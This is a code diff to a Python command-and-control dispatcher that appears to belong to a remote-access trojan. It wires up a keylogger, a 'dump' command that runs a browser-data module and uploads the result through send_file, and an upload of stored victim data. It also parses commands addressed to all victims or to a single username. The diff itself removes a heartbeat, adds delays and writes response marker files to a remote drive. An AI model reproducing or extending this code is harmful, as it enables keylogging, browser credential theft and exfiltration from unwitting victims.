@@ -1,15 +1,12 @@
 #%%
 from logger import log
+from time import sleep
 from .util import data_store, username
 from .keylogger import Keyloger
-from .drive import imactive, send_file, response
+from .drive import send_file, drive_file
 
 
 #%%
-def is_alive(*args, **kwargs):
-    # generally all user function
-    imactive()
-
 def dump(*args, **kwargs):
     from .browsers.module import run
     send_file(file_name=f"dump_{args[0]}.json", content=list(run()))
@@ -19,13 +16,12 @@ def set_value(*args, **kwargs):
     data_store.set_value(**kwargs)
 
 def start_logger(*args, **kwargs):
-    Keyloger(*args)
+    Keyloger(*args, **kwargs)
 
 def stored_value(*args, **kwargs):
     send_file(f"data_store_{args[0]}.json", data_store.var.__dict__)
 
 all_command={
-    "is_alive":is_alive,
     # "update":update,
     "dump":dump,
     # "ngrock":ngrock,
@@ -57,15 +53,22 @@ def parse_command(cmd:dict):
     for command in commands:
         all_time = int(command.get("time", -1))
         if all_time>last_all_time:
+
             log.info(f"executing user spacifig command {all_time}")
             execute(command)
             data_store.set_value("last_all_time", all_time)
+        
+        sleep(1)
 
     commands = cmd.get(username, [])
     for command in commands:
         user_time = int(command.get("time", -1))
         if user_time>last_user_time:
+            with drive_file(f"response/{user_time}") as f:
+                f.write("")
+            
             log.info(f"executing user spacifig command {user_time}")
-            response(user_time)
             execute(command)
             data_store.set_value("last_user_time", user_time)
+        
+        sleep(1)
